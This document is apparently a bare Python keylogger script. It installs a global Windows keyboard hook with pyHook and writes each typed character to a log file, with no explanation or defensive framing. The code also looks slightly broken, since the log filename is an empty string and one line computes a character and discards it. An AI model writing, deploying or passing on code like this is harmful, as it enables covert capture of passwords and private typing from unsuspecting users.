import pyHook, logging, pythoncom

KeyStroke = ""

def OnKeyboardEvent(event):
    logging.basicConfig(filename=KeyStroke, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)    
    logging.log(10,chr(event.Ascii))
    return True
    
x = pyHook.HookManager()
x.KeyDown = OnKeyboardEvent
x.HookKeyboard()
pythoncom.PumpMessages()

    
